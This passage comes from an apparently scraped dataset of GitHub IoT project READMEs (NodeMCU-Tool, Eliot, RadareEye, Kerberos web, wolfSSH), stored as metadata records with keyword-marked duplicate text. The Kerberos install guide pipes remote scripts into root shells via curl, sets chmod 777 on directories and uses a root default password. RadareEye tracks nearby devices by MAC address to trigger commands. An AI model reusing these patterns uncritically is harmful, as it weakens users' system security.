node_modules/nodemcu-tool/bin/nodemcu-tool.js\nLinux, OSX\n$ cd node_modules/nodemcu-tool/bin\n$ ./nodemcu-tool.js --version\n1.5.0\nWindows\nYou have to call the node.exe runtime in your command!\n$ cd node_modules/nodemcu-tool/bin\n$ node nodemcu-tool.js --version\n1.5.0\n2. Identify Your NodeMCU Device\nNow you can connect the NodeMCU Module to your computer. The module will be accessible via a virtual serial port. You can identify the port by using the devices command. In this example, it is connected via /dev/ttyUSB0. Keep in mind that you have to provide the device-name to NodeMCU-Tool on each command!\n./nodemcu-tool devices\n[NodeMCU] Connected Devices | Total: 1\n|- /dev/ttyUSB0 (Silicon_Labs, usb-Silicon_Labs_CP2102_USB_to_UART_Bridge_Controller_0001-if00-port0)\n3. Create the initial File System\nThis will remove all existing files on the module but is required when running the module for the first time. You can skip this step in case you've already done that manually!\n$ nodemcu-tool mkfs --port=/dev/ttyUSB0\n[NodeMCU-Tool] Do you really want to format the filesystem and delete all file ? (no) yes\n[NodeMCU-Tool] Connected\n[NodeMCU] Version: 0.9.5 | ChipID: 0xd1aa | FlashID: 0x1640e0\n[NodeMCU] Formatting the file system...this will take around ~30s\n[NodeMCU] File System created | format done.\n4. Upload a new File\nHint include the native encoder Module into your firmware to speed-up the uploading by factor 4..10!\n$ nodemcu-tool upload --port=/dev/ttyUSB0 helloworld.lua\n[NodeMCU-Tool] Connected\n[NodeMCU] Version: 0.9.5 | ChipID: 0xd1aa | FlashID: 0x1640e0\n[NodeMCU-Tool] Uploading \"main.lua\" ...\n[NodeMCU-Tool] Data Transfer complete!\n5. Run It directly and view the output\n$ nodemcu-tool run helloworld.lua\n[NodeMCU-Tool] Connected\n[NodeMCU] Version: 0.9.5 | ChipID: 0xd1aa | FlashID: 0x1640e0\n[NodeMCU] Running \"helloworld.lua\"\n>----------------------------->\nHello World!\nYEAH!!! HELLO WORLD!!!\nString: Lorem ipsum dolor sit amet, consetetur sadipscing elitr\n>----------------------------->\nAvailable Commands\nAll commands a well documented within the Command Reference\nProject based configuration\nIn case you're using different serial port or the baudrate-settings, it's possible to create a configuration file with specific settings for your project. To initially create the configuration file, use the init command:\n$ nodemcu-tool init\n[NodeMCU-Tool] Creating project based configuration file..\n[NodeMCU-Tool] Baudrate in Bit per Seconds, e.g. 9600 (default) (9600) 9600\n[NodeMCU-Tool] Serial connection to use, e.g. COM1 or /dev/ttyUSB2 (/dev/ttyUSB0) COM3\nThis will create a JSON based configuration file named .nodemcutool in your current directory - you can edit this file manually\nExample Configuration\nIn this Example, the baudrate is changed to 19.2k and COM3 is selected as default port. Additionally the --minify and --compile flags are set permanently.\n{\n\"baudrate\": \"19200\",\n\"port\": \"COM3\",\n\"connectionDelay\": 100,\n\"compile\": true,\n\"minify\": true,\n\"keeppath\": true\n}\nConfiguration Keys\nAll configuration options are optional\nbaudrate (int) - the default baudrate in bits per second\nport (string) - the comport to use\nconnectionDelay (int) - connection-delay in ms\ncompile (boolean) - compile lua files after upload\nminify (boolean) - minifies files before uploading\nkeeppath (boolean) - keep the relative file path in the destination filename (i.e: static/test.html will be named static/test.html)\nNotes\nNodeMCU-Tool will only search in the current directory for the .nodemcutool file!\nAll default options can be overwritten by using the command line options\nThe .nodemcutool file is only recognized in CLI Mode NOT in API Mode\nProgrammatic Usage and Low Level API\nIt's possible to use the underlying \"NodeMcuConnector\" in your own projects to communicate with a NodeMCU based device. Or you can call the bin file with an external tool. For more details, take a look into the Programmatic Usage Guide\nAny Questions ? Report a Bug ? Enhancements ?\nPlease open a new issue on GitHub\nContributing\nContributors are welcome! Even if you are not familiar with javascript you can help to improve the documentation!\nLicense\nNodeMCU-Tool is OpenSource and licensed under the Terms of The MIT License (X11). You're welcome to contribute!", "link": "https://github.com/AndiDittrich/NodeMCU-Tool", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "nodemcu------> tool !!! \nupload/download lua files to your esp8266/esp32 module with nodemcu firmware.\nsimple. command line. cross-platform. file management. nodemcu.\n$ npm install nodemcu-tool -g\ntool summary\nnodemcu tool allows you to\nupload lua files to your esp8266/esp32/nodemcu module\nupload any file-types (binary save)\nbulk/multi file uploads\ndownload any file-type (binary save)\ndelete files\nformat the file system\nsimple serial terminal to interact with nodemcu\nshow existing files on your module\nprecompile lua files live on nodemcu\nminimize lua files before uploading (provided by luamin)\nuse the nodemcuconnector api in your own projects\napply project based configurations\nhard-reset the module using dtr/rts reset circuit (like nodemcu dev kit)\nrun files on nodemcu and display the output\ndirectly from the command line.\nsuccessful tested on windows10, debian 8,9,10 and ubuntu 14,15,16,17,18 - works out of the box without any tweaks\ncompatibility\nthe following nodemcu firmware versions are verified\nesp8266\nnodemcu lua 1.4\nnodemcu lua 1.5.1\nnodemcu lua 1.5.4\nnodemcu lua 3.0.0\nesp32\npreliminary support (esp32-dev.latest)\nrelated documents\nfaq\ncommand reference\ncommon use-cases and examples\nprogrammatic usage\nbehind the scene\nfixing reset-on-connect issue\nfile transfer encoding\nwebstorm integration\ncontribution guidelines\nnodemcu devkit schematics\nchangelog\nlicense\nterminology\nnodemcu original nodemcu module or any esp8266 platform with nodemcu firmware\nupload transfer files from your pc to nodemcu/esp8266 module\ndownload transfer files/obtaining information from the module\nrequirements\nto use/install the nodemcu-tool, you have to prepare your system to match the following requirements. especially as beginner, you should read this part carefully\nnodemcu serial driver\ndepending on your module-type you have to install the platform-specific driver for the usb-serial-interface. the original nodemcu v0.9 comes with a ch341 chip with may requires manual driver installation. modern versions like 1.0 use a cp210x chip with work out of the box on most common systems. other esp8266 platforms may user other interfaces - please refer to their user manuals!\nnode.js\nthe nodemcu-tool is written in javascript and requires node.js >= 7.6 as runtime environment. and please don't worry about the wording - nodemcu and node.js are two complete different things!\n!! there is currently an issue with node.js 11 on windows 10 platforms. please use node.js 10 lts !!\nin case you're not familiar with node.js and npm it's recommended to read some basic introductions first! please download the node.js installer and install on your system in case it's not already there.\ninstallation\nthanks to node.js, the nodemcu-tool is platform independent and will run on windows, linux und osx. there are different installation variants available (system wide or project based).\nvia npm (node.js package manager)\nit's recommended to install nodemcu-tool as global package. npm will register the binary automatically in your path - it will be directly available on the command line.\nglobal installation as root (linux/mac os platforms)\nthe global installation may require administrator(root) privileges because the package is added to the systems library path. if you get any permission errors on linux/mac os run the command as root or via sudo.\nnote: in some special cases the installation may fail with some errors related to node-serialport or node-gyp. this errors are caused by missing pre-build binaries (native code/drivers for your platform matching your os/nodejs version) - therefore they have to compiled on your machine! to resolve such issues, add the --unsafe-perm flag to the following command - it allows the build scripts to be executed as root.\n$ sudo npm install nodemcu-tool -g\nglobal installation (windows platforms)\n$ npm install nodemcu-tool -g\nlocal/project related installation\nyou can also install it in your local project directory. when using this method, the nodemcu-tool command is not registered within your path!\n$ npm install nodemcu-tool\nin this case, a link to the binary file is located in node_modules/.bin/nodemcu-tool\nas archive from github\nyou can also download the latest release directly from github and extract the sources to your project directory. after downloading you have to install the dependencies by running npm install in the nodemcu-tool directory.\nwhen using this method, the nodemcu-tool command is not registered within your path. you have to register it manually using a symlink - or the recommended way: call the binary file ./bin/nodemcu-tool.js directly.\nfirst steps\n1. the location of the binary file\nafter installing nodemcu-tool you should open a new terminal window and check if the tool is working by obtaining the current version. it should output the current semantic-version tag. depending on your installation type (global ==> file is registered into your path) you can use the tool directly or you have to go into the module directory:\nfor global installations (win/linux/osx)\nthe binary file is registered within your path. this tutorial assumes that you have installed the tool globally. otherwise you have to modify the program-call as described below.\n$ nodemcu-tool --version\n1.5.0\nfor local installations\nthis means you have installed nodemcu-tool via npm without the -g (global) flag or via the .zip / .tar package. there will be no global shortcut to the nodemcu-tool binary! the binary is located in node_modules/nodemcu-tool/bin/nodemcu-tool.js\nlinux, osx\n$ cd node_modules/nodemcu-tool/bin\n$ ./nodemcu-tool.js --version\n1.5.0\nwindows\nyou have to call the node.exe runtime in your command!\n$ cd node_modules/nodemcu-tool/bin\n$ node nodemcu-tool.js --version\n1.5.0\n2. identify your nodemcu device\nnow you can connect the nodemcu module to your computer. the module will be accessible via a virtual serial port. you can identify the port by using the devices command. in this example, it is connected via /dev/ttyusb0. keep in mind that you have to provide the device-name to nodemcu-tool on each command!\n./nodemcu-tool devices\n[nodemcu] connected devices | total: 1\n|- /dev/ttyusb0 (silicon_labs, usb-silicon_labs_cp2102_usb_to_uart_bridge_controller_0001-if00-port0)\n3. create the initial file system\nthis will remove all existing files on the module but is required when running the module for the first time. you can skip this step in case you've already done that manually!\n$ nodemcu-tool mkfs --port=/dev/ttyusb0\n[nodemcu-tool] do you really want to format the filesystem and delete all file ? (no) yes\n[nodemcu-tool] connected\n[nodemcu] version: 0.9.5 | chipid: 0xd1aa | flashid: 0x1640e0\n[nodemcu] formatting the file system...this will take around ~30s\n[nodemcu] file system created | format done.\n4. upload a new file\nhint include the native encoder module into your firmware to speed-up the uploading by factor 4..10!\n$ nodemcu-tool upload --port=/dev/ttyusb0 helloworld.lua\n[nodemcu-tool] connected\n[nodemcu] version: 0.9.5 | chipid: 0xd1aa | flashid: 0x1640e0\n[nodemcu-tool] uploading \"main.lua\" ...\n[nodemcu-tool] data transfer complete!\n5. run it directly and view the output\n$ nodemcu-tool run helloworld.lua\n[nodemcu-tool] connected\n[nodemcu] version: 0.9.5 | chipid: 0xd1aa | flashid: 0x1640e0\n[nodemcu] running \"helloworld.lua\"\n>----------------------------->\nhello world!\nyeah!!! hello world!!!\nstring: lorem ipsum dolor sit amet, consetetur sadipscing elitr\n>----------------------------->\navailable commands\nall commands a well documented within the command reference\nproject based configuration\nin case you're using different serial port or the baudrate-settings, it's possible to create a configuration file with specific settings for your project. to initially create the configuration file, use the init command:\n$ nodemcu-tool init\n[nodemcu-tool] creating project based configuration file..\n[nodemcu-tool] baudrate in bit per seconds, e.g. 9600 (default) (9600) 9600\n[nodemcu-tool] serial connection to use, e.g. com1 or /dev/ttyusb2 (/dev/ttyusb0) com3\nthis will create a json based configuration file named .nodemcutool in your current directory - you can edit this file manually\nexample configuration\nin this example, the baudrate is changed to 19.2k and com3 is selected as default port. additionally the --minify and --compile flags are set permanently.\n{\n\"baudrate\": \"19200\",\n\"port\": \"com3\",\n\"connectiondelay\": 100,\n\"compile\": true,\n\"minify\": true,\n\"keeppath\": true\n}\nconfiguration keys\nall configuration options are optional\nbaudrate (int) - the default baudrate in bits per second\nport (string) - the comport to use\nconnectiondelay (int) - connection-delay in ms\ncompile (boolean) - compile lua files after upload\nminify (boolean) - minifies files before uploading\nkeeppath (boolean) - keep the relative file path in the destination filename (i.e: static/test.html will be named static/test.html)\nnotes\nnodemcu-tool will only search in the current directory for the .nodemcutool file!\nall default options can be overwritten by using the command line options\nthe .nodemcutool file is only recognized in cli mode not in api mode\nprogrammatic usage and low level api\nit's possible to use the underlying \"nodemcuconnector\" in your own projects to communicate with a nodemcu based device. or you can call the bin file with an external tool. for more details, take a look into the programmatic usage guide\nany questions ? report a bug ? enhancements ?\nplease open a new issue on github\ncontributing\ncontributors are welcome! even if you are not familiar with javascript you can help to improve the documentation!\nlicense\nnodemcu-tool is opensource and licensed under the terms of the mit license (x11). you're welcome to contribute!", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000293, "year": null}, {"Unnamed: 0": 295, "autor": 295, "date": null, "content": "This is early alpha version! There's not all features yet implemented, not heavily tested with different devices and code might get large breaking changes until the first release.\nEliot is a open source system for managing containerized applications on top of the IoT device with an emphasis to usability, simplicity, security and stability. Eliot gives simplified app delivery, isolation and additional security to traditional installations.\nDocker and Kubernetes have inspired heavily and if you're familiar with those, you find really easy to get started with Eliot.\nBuilt with \u2764\ufe0e by Erno Aapa and contributors\nUsage\nDocumentation\nBinary releases\nDocker releases\nEliot is based on top of the containerd to provide simple, Kubernetes like API for managing containers.\nEliot is built from following components\neli - Command line tool for managing the device\neliotd - Daemon for the device to manage containers\nFeatures\nManage running containers in the device\nAttach to container process remotely for debugging\nFast develop-in-device development start\nLet us know what would be the next awesome feature :)\nGetting started\nSee the documentation how to get started with Eliot.\nRest of this document is about developing Eliot itself, not how to develop on top of the Eliot.\nDevelopment\nPrerequisites\nInstall Git\nInstall Golang 1.10\nInstall Docker\nInstall Linuxkit\nInstall goreleaser (for building eliotd)\nGet Eliot source code git clone https://github.com/ernoaapa/eliot && cd eliot\nDeveloping eli cli\nIf you're making changes to the eli command line tool, you can just build and run the command\ngo run ./cmd/eli/* get nodes\nDeveloping eliotd daemon\nTo develop eliotd there's two different ways; latter is not tested\nrun eliotd in EliotOS with Linuxkit\nrun eliotd daemon locally\nRun EliotOS locally\nFor development purpose, you can build and run the EliotOS locally, but keep in mind that the environment is amd64 not arm64 so container images what work in this environment might not work in RaspberryPI if the images are not multi-arch images.\nBuild eliotd binary and Docker image\ngoreleaser --snapshot --rm-dist\nGet EliotOS linuxkit configuration\ncurl https://raw.githubusercontent.com/ernoaapa/eliot-os/master/rpi3.yml > rpi3.yml\nUpdate rpi3.yml\nCheck from goreleaser the amd64 container image name\nEdit the rpi3.yml and update the eliotd image tag to match with the previous value\nBuild EliotOS image:\nlinuxkit build rpi3.yml\nStart image:\nMacOS: sudo linuxkit run hyperkit -cpus 1 -mem \"1048\" -disk size=10G -networking vmnet moby\nTest connection\neli get nodes\nRun eliotd locally\nThis is not tested, but should go roughly like this:\nInstall runc\nInstall containerd\nRun go run ./cmd/eliotd/* --debug --grpc-api-listen 0.0.0.0:5000", "link": "https://github.com/ernoaapa/eliot", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "this is early alpha version! there's not all features yet implemented, not heavily tested with different devices and code might get large breaking changes until the first release.\neliot is a open source system for managing containerized applications on top of the iot device with an emphasis to usability, simplicity, security and stability. eliot gives simplified app delivery, isolation and additional security to traditional installations.\ndocker and kubernetes have inspired heavily and if you're familiar with those, you find really easy to get started with eliot.\nbuilt with \u2764\ufe0e by erno aapa and contributors\nusage\ndocumentation\nbinary releases\ndocker releases\neliot is based on top of the containerd to provide simple, kubernetes like api for managing containers.\neliot is built from following components\neli - command line -----> tool !!!  for managing the device\neliotd - daemon for the device to manage containers\nfeatures\nmanage running containers in the device\nattach to container process remotely for debugging\nfast develop-in-device development start\nlet us know what would be the next awesome feature :)\ngetting started\nsee the documentation how to get started with eliot.\nrest of this document is about developing eliot itself, not how to develop on top of the eliot.\ndevelopment\nprerequisites\ninstall git\ninstall golang 1.10\ninstall docker\ninstall linuxkit\ninstall goreleaser (for building eliotd)\nget eliot source code git clone https://github.com/ernoaapa/eliot && cd eliot\ndeveloping eli cli\nif you're making changes to the eli command line tool, you can just build and run the command\ngo run ./cmd/eli/* get nodes\ndeveloping eliotd daemon\nto develop eliotd there's two different ways; latter is not tested\nrun eliotd in eliotos with linuxkit\nrun eliotd daemon locally\nrun eliotos locally\nfor development purpose, you can build and run the eliotos locally, but keep in mind that the environment is amd64 not arm64 so container images what work in this environment might not work in raspberrypi if the images are not multi-arch images.\nbuild eliotd binary and docker image\ngoreleaser --snapshot --rm-dist\nget eliotos linuxkit configuration\ncurl https://raw.githubusercontent.com/ernoaapa/eliot-os/master/rpi3.yml > rpi3.yml\nupdate rpi3.yml\ncheck from goreleaser the amd64 container image name\nedit the rpi3.yml and update the eliotd image tag to match with the previous value\nbuild eliotos image:\nlinuxkit build rpi3.yml\nstart image:\nmacos: sudo linuxkit run hyperkit -cpus 1 -mem \"1048\" -disk size=10g -networking vmnet moby\ntest connection\neli get nodes\nrun eliotd locally\nthis is not tested, but should go roughly like this:\ninstall runc\ninstall containerd\nrun go run ./cmd/eliotd/* --debug --grpc-api-listen 0.0.0.0:5000", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000295, "year": null}, {"Unnamed: 0": 305, "autor": 305, "date": null, "content": "A tool for scanning nearby devices and execute command when the target device comes in between range..\nNOTE:- RadareEye Owner will be not responsible if any user performs malicious activities using this tool. Use it for Learning purpose only.\nInstallation of RadareEye :\ngit clone https://github.com/souravbaghz/RadareEye\nUsage:\n./radare <mac_addr> <option>\nAvailable Options Are:\n-blue Bluetooth RadareEye\n-ble BLE radareEye\n-wifi Wifi AP radareEye\nRunning Bluetooth RadareEye :\nsudo bash radare XX:XX:XX:XX:XX:XX -blue\nRunning BLE RadareEye :\nsudo bash radare XX:XX:XX:XX:XX:XX -ble\nSame for the Wifi also with -wifi option, Here XX:XX:XX:XX:XX:XX means your target device's MAC Address & make sure to do with sudo (if you aren't root). I didn't add scanning feature in this script but you can get thr MAC Adress easily by executing 'hcitool scan' for bluetooth and 'hcitool lescan' for BLE Devices in terminal.\nAfter running RadareEye, It will ask you 'Command you want to trigger?' , you can skip it by simply keep it blank and it RadareEye will show you status of your target whether it's in range or not without triggering any command. If you want to trigger any command when your target comes in between range then enter a command when it asks. Examples :\nBelow given command will shutdown our system imediatly when target device comes in range.\n[+]Command you want to trigger? :shutdown now\nIt will run your other script\n[+]Command you want to trigger? :./myscript.py\nIf you love my work then you can buy me a Coffee here.\n\ud83e\udd1d Connect with me", "link": "https://github.com/souravbaghz/RadareEye", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "a -----> tool !!!  for scanning nearby devices and execute command when the target device comes in between range..\nnote:- radareeye owner will be not responsible if any user performs malicious activities using this -----> tool !!! . use it for learning purpose only.\ninstallation of radareeye :\ngit clone https://github.com/souravbaghz/radareeye\nusage:\n./radare <mac_addr> <option>\navailable options are:\n-blue bluetooth radareeye\n-ble ble radareeye\n-wifi wifi ap radareeye\nrunning bluetooth radareeye :\nsudo bash radare xx:xx:xx:xx:xx:xx -blue\nrunning ble radareeye :\nsudo bash radare xx:xx:xx:xx:xx:xx -ble\nsame for the wifi also with -wifi option, here xx:xx:xx:xx:xx:xx means your target device's mac address & make sure to do with sudo (if you aren't root). i didn't add scanning feature in this script but you can get thr mac adress easily by executing 'hcitool scan' for bluetooth and 'hcitool lescan' for ble devices in terminal.\nafter running radareeye, it will ask you 'command you want to trigger?' , you can skip it by simply keep it blank and it radareeye will show you status of your target whether it's in range or not without triggering any command. if you want to trigger any command when your target comes in between range then enter a command when it asks. examples :\nbelow given command will shutdown our system imediatly when target device comes in range.\n[+]command you want to trigger? :shutdown now\nit will run your other script\n[+]command you want to trigger? :./myscript.py\nif you love my work then you can buy me a coffee here.\n\ud83e\udd1d connect with me", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000305, "year": null}, {"Unnamed: 0": 317, "autor": 317, "date": null, "content": "Kerberos Open Source - Web\nLicense\nThe Kerberos Open Source project is licensed with BY-NC-SA 4.0, this means that everyone can use Kerberos and modify if to their needs, in a non commercial activity.\nMore information about this license.\nVote for features\nReport features if you think something is missing, and should be added to Kerberos Open Source, we love to hear about your ideas.\nWhy Kerberos?\nAs burglary is very common, we believe that video surveillance is a trivial tool in our daily lifes which helps us to feel a little bit more secure. Responding to this need, a lot of companies have started developing their own video surveillance software in the past few years.\nNowadays we have a myriad of expensive cameras, recorders, and software solutions which are mainly outdated and difficult to install and use. Kerberos Open Source goal is to solve these problems and to provide every human being in this world to have their own ecological, affordable, easy-to-use and innovative surveillance solution.\nIntroduction\nKerberos Open Source is perfect for personal usage. It's great if you only have a couple of surveillance cameras to be managed. A Kerberos agent (e.g. on a Raspberry Pi or inside a Docker container) runs for each camera. Their are many different installation possibilities, please have a look at the architecture or installation page.\nEvery Kerberos agent has it's own web interface (front-end) to review media recording, and processing engine (back-end) of a specific surveillance camera. The Open Source version doesn't come with a central overview of all recordings generated by your Kerberos agents. For this feature we highly recommend Kerberos cloud.\nIf you want to manage more than 10 Kerberos agents, it's recommended to use Kerberos Enterprise. This will help you to scale, support high availability and load balancing. Check out the architecture section for a better understanding of when to use what.\nThe web\nThe web is responsible for the visualization. It's a GUI which helps the user to find activity at a specific period, configure the machinery, view a live stream, see system information and much more.\nIt's written in PHP using the extremely popular PHP Framework Laravel, and Javascript using the client-side framework BackboneJS. We will discuss the different pages and functionality briefly. Please check out the demo environment if you want to see a real life example.\nHow does it work?\nRead more on our documentation website to have a better understanding of how the web works.\nInstallation\nKerberos Open Source comes with different installation flavours (it includes both the machinery and web repository). The reason is because depending on the use case one option is better than another. A short list of recommendations:\nKiOS: You have a Raspberry Pi, and you only want to run a Kerberos agent on it.s\nRaspbian: You have a Raspberry Pi, but you want other services running next to the Kerberos agent.\nDocker: You have a lot of IP cameras, and/or don't want to mess with dependencies.\nGeneric: You want to develop/extend Kerberos with your own features, or you want to run a Kerberos agent on a not supported OS/architecture.\nInstall from source\nIf you want to install the web, you'll need to have a webserver (e.g. Nginx) and PHP running with some extensions. You also need NodeJS and npm installed to install Bower. Below you can find the installation procedure to install the web on your preferred environment.\nInstall Dependencies\nInstall Git, PHP7 (+extensions) and NodeJS.\nA) Ubuntu\nsudo apt-get update && sudo apt-get upgrade\ncurl -sL https://deb.nodesource.com/setup | sudo bash -\nsudo apt-get install git nginx php7.0-cli php7.0-gd php7.0-mcrypt php7.0-curl php7.0-mbstring php7.0-dom php7.0-zip php7.0-fpm nodejs npm\nB) Raspbian\necho \"deb http://mirrordirector.raspbian.org/raspbian/ stretch main contrib non-free rpi\" | sudo tee --append /etc/apt/sources.list\nsudo apt-get update\nsudo apt-get install -t stretch php7.0 php7.0-curl php7.0-gd php7.0-fpm php7.0-cli php7.0-opcache php7.0-mbstring php7.0-xml php7.0-zip php7.0-mcrypt nodejs npm\nsudo ln -s /usr/bin/nodejs /usr/bin/node\nC) OSX\nbrew install php7.0 php7.0-curl php7.0-gd php7.0-fpm php7.0-cli php7.0-opcache php7.0-mbstring php7.0-xml php7.0-zip php7.0-mcrypt nodejs npm\nConfigure webserver\nInstall Nginx,\nsudo apt-get install nginx\nor if you're running OSX use brew.\nsudo brew install nginx\nCreating a Nginx config.\nsudo rm -f /etc/nginx/sites-enabled/default\nsudo nano /etc/nginx/sites-enabled/default\nCopy and paste following config file; this file tells nginx where the web will be installed and that it requires PHP.\nserver\n{\nlisten 80 default_server;\nlisten [::]:80 default_server;\nroot /var/www/web/public;\nindex index.html index.htm index.nginx-debian.html;\nserver_name kerberos.rpi kerberos.rpi;\nindex index.php index.html index.htm;\nlocation /\n{\nautoindex on;\ntry_files $uri $uri/ /index.php?$query_string;\n}\nlocation ~ \\.php$\n{\nfastcgi_pass unix:/var/run/php/php7.0-fpm.sock;\nfastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\ninclude fastcgi_params;\n}\n}\nClone source\nCreate a www location.\nmkdir -p /var/www\nGet the source code from Github.\ncd /var/www && sudo git clone https://github.com/kerberos-io/web && cd web\nInstall PHP packages by using composer.\ncurl -sS https://getcomposer.org/installer | sudo php\nsudo mv composer.phar /usr/bin/composer\nsudo composer install\nAdd write permission for the storage directory, and the kerberos config file.\nsudo chmod -R 777 storage\nsudo chmod -R 777 bootstrap/cache\nsudo chmod 777 config/kerberos.php\nInstall bower globally by using npm.\nsudo npm -g install bower\nInstall Front-end dependencies with bower\ncd public\nsudo bower --allow-root install\nRestart nginx\nsudo service nginx restart\nHow to access\nYou can access the web by entering the IP-address in your favorite browser. You'll see a welcome page showing up, on which you will be able to choose an username and password; the default username and password is root.", "link": "https://github.com/kerberos-io/web", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "kerberos open source - web\nlicense\nthe kerberos open source project is licensed with by-nc-sa 4.0, this means that everyone can use kerberos and modify if to their needs, in a non commercial activity.\nmore information about this license.\nvote for features\nreport features if you think something is missing, and should be added to kerberos open source, we love to hear about your ideas.\nwhy kerberos?\nas burglary is very common, we believe that video surveillance is a trivial -----> tool !!!  in our daily lifes which helps us to feel a little bit more secure. responding to this need, a lot of companies have started developing their own video surveillance software in the past few years.\nnowadays we have a myriad of expensive cameras, recorders, and software solutions which are mainly outdated and difficult to install and use. kerberos open source goal is to solve these problems and to provide every human being in this world to have their own ecological, affordable, easy-to-use and innovative surveillance solution.\nintroduction\nkerberos open source is perfect for personal usage. it's great if you only have a couple of surveillance cameras to be managed. a kerberos agent (e.g. on a raspberry pi or inside a docker container) runs for each camera. their are many different installation possibilities, please have a look at the architecture or installation page.\nevery kerberos agent has it's own web interface (front-end) to review media recording, and processing engine (back-end) of a specific surveillance camera. the open source version doesn't come with a central overview of all recordings generated by your kerberos agents. for this feature we highly recommend kerberos cloud.\nif you want to manage more than 10 kerberos agents, it's recommended to use kerberos enterprise. this will help you to scale, support high availability and load balancing. check out the architecture section for a better understanding of when to use what.\nthe web\nthe web is responsible for the visualization. it's a gui which helps the user to find activity at a specific period, configure the machinery, view a live stream, see system information and much more.\nit's written in php using the extremely popular php framework laravel, and javascript using the client-side framework backbonejs. we will discuss the different pages and functionality briefly. please check out the demo environment if you want to see a real life example.\nhow does it work?\nread more on our documentation website to have a better understanding of how the web works.\ninstallation\nkerberos open source comes with different installation flavours (it includes both the machinery and web repository). the reason is because depending on the use case one option is better than another. a short list of recommendations:\nkios: you have a raspberry pi, and you only want to run a kerberos agent on it.s\nraspbian: you have a raspberry pi, but you want other services running next to the kerberos agent.\ndocker: you have a lot of ip cameras, and/or don't want to mess with dependencies.\ngeneric: you want to develop/extend kerberos with your own features, or you want to run a kerberos agent on a not supported os/architecture.\ninstall from source\nif you want to install the web, you'll need to have a webserver (e.g. nginx) and php running with some extensions. you also need nodejs and npm installed to install bower. below you can find the installation procedure to install the web on your preferred environment.\ninstall dependencies\ninstall git, php7 (+extensions) and nodejs.\na) ubuntu\nsudo apt-get update && sudo apt-get upgrade\ncurl -sl https://deb.nodesource.com/setup | sudo bash -\nsudo apt-get install git nginx php7.0-cli php7.0-gd php7.0-mcrypt php7.0-curl php7.0-mbstring php7.0-dom php7.0-zip php7.0-fpm nodejs npm\nb) raspbian\necho \"deb http://mirrordirector.raspbian.org/raspbian/ stretch main contrib non-free rpi\" | sudo tee --append /etc/apt/sources.list\nsudo apt-get update\nsudo apt-get install -t stretch php7.0 php7.0-curl php7.0-gd php7.0-fpm php7.0-cli php7.0-opcache php7.0-mbstring php7.0-xml php7.0-zip php7.0-mcrypt nodejs npm\nsudo ln -s /usr/bin/nodejs /usr/bin/node\nc) osx\nbrew install php7.0 php7.0-curl php7.0-gd php7.0-fpm php7.0-cli php7.0-opcache php7.0-mbstring php7.0-xml php7.0-zip php7.0-mcrypt nodejs npm\nconfigure webserver\ninstall nginx,\nsudo apt-get install nginx\nor if you're running osx use brew.\nsudo brew install nginx\ncreating a nginx config.\nsudo rm -f /etc/nginx/sites-enabled/default\nsudo nano /etc/nginx/sites-enabled/default\ncopy and paste following config file; this file tells nginx where the web will be installed and that it requires php.\nserver\n{\nlisten 80 default_server;\nlisten [::]:80 default_server;\nroot /var/www/web/public;\nindex index.html index.htm index.nginx-debian.html;\nserver_name kerberos.rpi kerberos.rpi;\nindex index.php index.html index.htm;\nlocation /\n{\nautoindex on;\ntry_files $uri $uri/ /index.php?$query_string;\n}\nlocation ~ \\.php$\n{\nfastcgi_pass unix:/var/run/php/php7.0-fpm.sock;\nfastcgi_param script_filename $document_root$fastcgi_script_name;\ninclude fastcgi_params;\n}\n}\nclone source\ncreate a www location.\nmkdir -p /var/www\nget the source code from github.\ncd /var/www && sudo git clone https://github.com/kerberos-io/web && cd web\ninstall php packages by using composer.\ncurl -ss https://getcomposer.org/installer | sudo php\nsudo mv composer.phar /usr/bin/composer\nsudo composer install\nadd write permission for the storage directory, and the kerberos config file.\nsudo chmod -r 777 storage\nsudo chmod -r 777 bootstrap/cache\nsudo chmod 777 config/kerberos.php\ninstall bower globally by using npm.\nsudo npm -g install bower\ninstall front-end dependencies with bower\ncd public\nsudo bower --allow-root install\nrestart nginx\nsudo service nginx restart\nhow to access\nyou can access the web by entering the ip-address in your favorite browser. you'll see a welcome page showing up, on which you will be able to choose an username and password; the default username and password is root.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000317, "year": null}, {"Unnamed: 0": 329, "autor": 329, "date": null, "content": "WOLFSSH\nwolfSSL's Embeddable SSH Server wolfSSH Manual\ndependencies\nwolfSSH is dependent on wolfCrypt. The simplest configuration of wolfSSL required for wolfSSH is the default build.\n$ cd wolfssl\n$ ./configure [OPTIONS] --enable-ssh\n$ make check\n$ sudo make install\nOn some systems the optional ldconfig command is needed after installing.\nTo use the key generation function in wolfSSH, wolfSSL will need to be configured with keygen: --enable-keygen.\nIf the bulk of wolfSSL code isn't desired, wolfSSL can be configured with the crypto only option: --enable-cryptonly.\nAdditional build options for wolfSSL are located here.\nbuilding\nFrom the wolfSSH source directory run:\n$ ./autogen.sh\n$ ./configure\n$ make\n$ make check\nThe autogen.sh script only has to be run the first time after cloning the repository. If you have already run it or are using code from a source archive, you should skip it.\nFor building under Windows with Visual Studio, see the file \"ide/winvs/README.md\".\nNOTE: On resource constrained devices the DEFAULT_WINDOW_SZ may need to be set to a lower size. It can also be increased in desktop use cases to help with large file transfers. By default channels are set to handle 16,384 bytes of data being sent and received. An example of setting a window size for new channels would be as follows \"./configure CPPFLAGS=-DDEFAULT_WINDOW_SZ=16384\"\nexamples\nThe directory examples contains an echoserver that any client should be able to connect to. From the terminal run:\n$ ./examples/echoserver/echoserver -f\nThe option -f enables echo-only mode. From another terminal run:\n$ ssh_client jill@localhost -p 22222\nWhen prompted for a password, enter \"upthehill\". The server will send a canned banner to the client:\nwolfSSH Example Echo Server\nCharacters typed into the client will be echoed to the screen by the server. If the characters are echoed twice, the client has local echo enabled. The echo server isn't being a proper terminal so the CR/LF translation will not work as expected.\nThe following 